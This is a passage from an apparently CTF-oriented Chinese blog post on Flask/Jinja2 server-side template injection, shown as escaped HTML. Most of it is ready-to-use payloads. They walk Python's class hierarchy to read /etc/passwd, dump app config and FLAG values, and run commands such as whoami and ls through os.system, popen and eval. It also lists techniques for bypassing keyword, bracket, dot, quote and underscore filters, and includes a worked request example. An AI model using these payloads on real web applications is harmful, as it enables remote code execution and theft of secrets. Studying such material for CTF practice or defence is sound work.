&lt;p>&lt;code>&amp;lt;type 'file'&amp;gt;&lt;/code>是py2的专属，直接可以用&lt;code>read()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>readlines()&lt;/code>进行文件读写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>os&lt;/code>模块就不必说了，有&lt;code>system()&lt;/code>可以直接rce的函数；在py2中这两个子类可以直接用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site._Printer&amp;#39;&amp;gt;, 71&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;site.Quitter&amp;#39;&amp;gt;, 76&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;FLAG]}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不嫌麻烦的还可以再套一层，用&lt;code>linecache&lt;/code>来调用&lt;code>os&lt;/code>，py2中有这两个类含有&lt;code>linecache&lt;/code>模块&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, 58&lt;/span>
&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;, 59&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;linecache&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="py3---__builtins__">py3 - __builtins__&lt;/h4>
&lt;p>py3中就没这么直接，要关注的模块是&lt;code>__builtins__&lt;/code>，借助它来调用内置的&lt;code>open()&lt;/code>进行文件读写，用&lt;code>eval()&lt;/code>将&lt;code>os&lt;/code>模块引入rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;whoami&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;open&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者是直接用&lt;code>__import__&lt;/code>加载&lt;code>os&lt;/code>模块执行命令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>py2有个特殊的&lt;code>commands&lt;/code>模块也可以直接rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;commands&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getstatusoutput&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>——————注意引用&lt;code>__builtins__&lt;/code>内建模块这一方式在py2&amp;amp;py3完全通杀&lt;/p>
&lt;h2 id="常用payload">常用payload&lt;/h2>
&lt;p>其实上面已经列举的比较全啦，这里做一些小小的补充&lt;/p>
&lt;h3 id="for语句确定索引位置">for语句确定索引位置&lt;/h3>
&lt;p>前面提到过一点，我们需要的子类在python不同版本中位置并不固定（主要是py3 py2的基本固定死了），针对这个问题可以用Jinja支持的for语句来解决，submodule的名字可以用上面的脚本跑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;filename&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;) }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="特殊的一些对象">特殊的一些对象&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{config}}
{{config.items()}}
{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{url_for.__globals__[&amp;#39;__builtins__&amp;#39;].__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;)}}
{{url_for.__globals__[&amp;#39;current_app&amp;#39;].config.FLAG}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{request.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/etc/passwd&amp;#39;).read()}}
{{request.application.__self__._get_data_for_json.__globals__[&amp;#39;json&amp;#39;].JSONEncoder.default.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="各种各样的bypass">各种各样的bypass&lt;/h2>
&lt;p>一般都不会只过滤一种的，综合应用&lt;/p>
&lt;h3 id="针对关键字的过滤">针对关键字的过滤&lt;/h3>
&lt;p>以class为例，做一个字符串的拼接&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cl&amp;#39;&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;ass&amp;#39;&lt;/span> &lt;span style="color:#75715e"># 拼接&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cl&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;ass&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cla&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ss&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 拼接&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;Y2xhc3M=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;base64&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># b64&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0063\u006C\u0061\u0073\u0073&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># unicode&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x63\x6c\x61\x73\x73&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># hex&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤">过滤&lt;code>[]&lt;/code>&lt;/h3>
&lt;p>&lt;code>[]&lt;/code>用在字典按索引取值和数组中取值，不过禁止了还是有函数可以用&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>__getitem__&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>pop()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#ae81ff">.0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">linecache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-1">过滤&lt;code>.&lt;/code>&lt;/h3>
&lt;p>&lt;code>.&lt;/code>点号用在向下不停地取值，跟&lt;code>[]&lt;/code>很像&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__class__&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>attr()&lt;/code> 很强的一个flask内置filter，&lt;code>foo|attr(&amp;quot;bar&amp;quot;) == foo.bar&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__base__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">............&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-2">过滤&lt;code>'&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>chr&lt;/code> 先找出&lt;code>chr()&lt;/code>的位置（注意跑脚本跑的是&lt;code>__builtins__&lt;/code> 这个函数是内建的），用模板语句给它赋个值，然后调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code> flask中存储请求参数及值的字典，可以将值先赋给它然后进行调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>arg1=os
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤_">过滤&lt;code>_&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{&amp;#39;&amp;#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&amp;#39;/etc/passwd&amp;#39;).read() }}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>class=__class__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>base=__base__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>subclasses=__subclasses__
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这种方式可以结合get和post，举例-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr">[CTFshow 击剑杯]通关大佬&lt;/a>，在不同的字段处对传入参数的限制是不同的&lt;/p>
&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021年11月11日
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>按字符串的方式走，也可&lt;/p>
&lt;/li>
&lt;/ul>
